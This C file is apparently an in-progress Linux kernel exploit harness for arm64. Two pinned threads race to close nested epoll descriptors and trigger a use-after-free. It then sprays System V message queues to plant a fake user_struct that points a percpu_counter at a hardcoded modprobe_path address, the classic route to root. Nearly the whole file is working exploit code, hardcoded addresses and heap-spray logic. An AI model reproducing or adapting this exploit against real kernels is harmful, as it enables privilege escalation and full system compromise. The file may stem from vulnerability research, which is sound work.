#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <sys/syscall.h>

int ep_outer, ep_inner;
int pipefd[2];
int msgq_id1, msgq_id2;

struct msg_struct {
    long mtype;
    char mtext[144]; // 144 bytes user data -> kmalloc-192
};

volatile int state = 0;

// Target addresses (from GDB, hardcoded for this run)
#define MODPROBE_PATH_ADDR 0xffff80008161d668

// Fake user_struct layout (offsets from user_struct start)
// offset 0: __count (refcount_t, 4 bytes) + padding
// offset 8: epoll_watches (percpu_counter)
// percpu_counter layout:
//   offset 0: raw_spinlock_t lock (4 bytes)
//   offset 8: s64 count (8 bytes)
//   offset 16: struct list_head list (16 bytes on arm64)
//   offset 32: s32 *counters (8 bytes)

void craft_spray1_reclaim_outer(struct msg_struct *msg, uint64_t fake_user_struct_addr) {
    memset(msg->mtext, 0x00, sizeof(msg->mtext));
    // This spray reclaims the OUTER epoll slot (which we'll free in a different setup)
    // For now, just fill with pattern
    *(uint32_t*)(msg->mtext + 48) = 0x00000000;  // spinlock
    *(uint64_t*)(msg->mtext + 56) = 0x0000000000000000; // rb_root
    *(uint64_t*)(msg->mtext + 64) = 0x0000000000000000; // rb_leftmost
    *(uint64_t*)(msg->mtext + 88) = fake_user_struct_addr - 8; // ep->user = fake_user_struct - 8 (so user+8 = percpu_counter)
    *(uint64_t*)(msg->mtext + 112) = 0xDEAD000000000000; // marker
}

void craft_spray2_fake_user_struct(struct msg_struct *msg) {
    memset(msg->mtext, 0x00, sizeof(msg->mtext));
    // This msg_msg IS the fake user_struct
    // user_struct starts at msg->mtext (slab offset 48 = user byte 0)
    // We need:
    // user_struct + 8 = percpu_counter start
    // percpu_counter.lock = 0 (offset 8 from user_struct = user byte 8)
    // percpu_counter.count = 0 (offset 16 from user_struct = user byte 16)
    // percpu_counter.counters = &modprobe_path (offset 40 from user_struct = user byte 40)
    
    *(uint32_t*)(msg->mtext + 8) = 0x00000000; // lock = 0 (unlocked)
    *(uint64_t*)(msg->mtext + 16) = 0x0000000000000000; // count = 0
    *(uint64_t*)(msg->mtext + 40) = MODPROBE_PATH_ADDR; // counters = modprobe_path
    
    printf("[*] Crafted fake user_struct at msg->mtext:\n");
    printf("  lock (byte 8) = 0\n");
    printf("  count (byte 16) = 0\n");
    printf("  counters (byte 40) = %p\n", (void*)MODPROBE_PATH_ADDR);
}

void print_hex(const char *label, const void *data, size_t len) {
    const uint8_t *p = (const uint8_t*)data;
    printf("%s:\n", label);
    for (size_t i = 0; i < len; i += 16) {
        printf("  %04zx: ", i);
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            printf("%02x ", p[i + j]);
        }
        printf("\n");
    }
}

void *thread_a(void *arg) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    state = 1;
    close(ep_outer);
    return NULL;
}

void *thread_b(void *arg) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    while (state == 0) {}
    usleep(100000);
    close(ep_inner);
    
    // Spray 1: reclaim outer epoll (if we can free it)
    struct msg_struct msg1;
    msg1.mtype = 0x1337;
    craft_spray1_reclaim_outer(&msg1, 0); // Will be updated by GDB
    
    // Spray 2: fake user_struct
    struct msg_struct msg2;
    msg2.mtype = 0x1338;
    craft_spray2_fake_user_struct(&msg2);
    
    printf("[*] Thread B starting msgsnd loops...\n");
    fflush(stdout);
    int sent1 = 0, sent2 = 0;
    for (int i = 0; i < 5000; i++) {
        int r1 = msgsnd(msgq_id1, &msg1, sizeof(msg1.mtext), IPC_NOWAIT);
        int r2 = msgsnd(msgq_id2, &msg2, sizeof(msg2.mtext), IPC_NOWAIT);
        if (r1 == 0) sent1++;
        if (r2 == 0) sent2++;
        if (r1 < 0 && r2 < 0) {
            printf("[*] msgsnd failed: r1=%d (errno=%d), r2=%d (errno=%d)\n", r1, errno, r2, errno);
            break;
        }
    }
    printf("[*] Spray complete. Sent1=%d, Sent2=%d\n", sent1, sent2);
    fflush(stdout);
    syscall(147, 1337, 1337, 1337);
    return NULL;
}

int main() {
    printf("[*] Starting EXP-023b harness (percpu_counter_dec test)...\n");
    printf("[*] Target: modprobe_path at %p\n", (void*)MODPROBE_PATH_ADDR);
    
    msgq_id1 = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    msgq_id2 = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msgq_id1 == -1 || msgq_id2 == -1) { perror("msgget"); return 1; }
    printf("[*] msgq_id1 = %d, msgq_id2 = %d\n", msgq_id1, msgq_id2);

    pipe(pipefd);

    state = 0;
    ep_outer = epoll_create1(0);
    ep_inner = epoll_create1(0);
    
    struct epoll_event ev;
    ev.events = EPOLLIN;
    ev.data.fd = ep_inner;
    epoll_ctl(ep_outer, EPOLL_CTL_ADD, ep_inner, &ev);
    
    pthread_t ta, tb;
    pthread_create(&ta, NULL, thread_a, NULL);
    pthread_create(&tb, NULL, thread_b, NULL);
    
    pthread_join(ta, NULL);
    pthread_join(tb, NULL);
    
    printf("[*] Done.\n");
    return 0;
}